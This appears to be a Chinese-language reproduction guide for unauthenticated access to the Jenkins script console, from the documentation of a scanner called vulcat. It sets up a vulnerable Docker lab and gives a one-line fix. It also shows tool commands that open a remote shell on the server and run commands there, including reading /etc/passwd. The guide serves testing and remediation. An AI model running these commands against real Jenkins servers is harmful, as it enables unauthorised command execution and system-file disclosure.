# 🧡 Jenkins未授权访问

### 1）漏洞信息

|漏洞名称	|受影响组件	|漏洞类型	|漏洞编号	|
|--	|--	|--	|--	|
|Jenkins未授权访问	|[Jenkins](https://www.jenkins.io/zh/)	|未授权访问	|暂无	|

|漏洞简介	|
|--	|
|<p>默认情况下 Jenkins面板中用户可以选择执行脚本界面 来操作一些系统层命令</p>攻击者可通过未授权访问漏洞，或者暴力破解用户密码等方式进入后台管理服务，通过脚本执行界面获取服务器权限	|

|参考链接	|
|--	|
|<ol><li><a href="https://blog.csdn.net/weixin_40412037/article/details/120369441">https://blog.csdn.net/weixin_40412037/article/details/120369441</a></li></ol>	|

|补丁及修复方案	|
|--	|
|<ol><li>配置Jenkins登录验证</li></ol>	|

### 漏洞环境

```
docker pull jenkins:1.625.1
docker run -itd -p 8080:8080 -p 50000:50000 jenkins:1.625.1
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/01.png" alt=""><figcaption></figcaption></figure>

启动容器后，访问8080端口即可看到jenkins页面
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/02.png" alt=""><figcaption></figcaption></figure>


### 漏洞复现

```
python3 vulcat.py <URL> -a jenkins -v unauth

# 注意, vulcat-v2.0.0版本及以上, 应使用以下命令
python3 vulcat.py -u <URL> -v jenkins-unauth
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/03.png" alt=""><figcaption></figcaption></figure>

你可以使用Request数据包：
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/04.png" alt=""><figcaption></figcaption></figure>
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/09.png" alt=""><figcaption></figcaption></figure>


#### 支持--shell选项
```
python3 vulcat.py <URL> -a jenkins -v unauth --shell

# 注意, vulcat-v2.0.0版本及以上, -a选项被移除, 应使用以下命令
python3 vulcat.py <URL> -v jenkins-unauth --shell

```
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/05.png" alt=""><figcaption></figcaption></figure>

* id
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/06.png" alt=""><figcaption></figcaption></figure>

* ls -l
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/07.png" alt=""><figcaption></figcaption></figure>

* cat /etc/passwd | vcsearch .{0,20}root.{0,800}
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/jenkins/unauth/08.png" alt=""><figcaption></figcaption></figure>
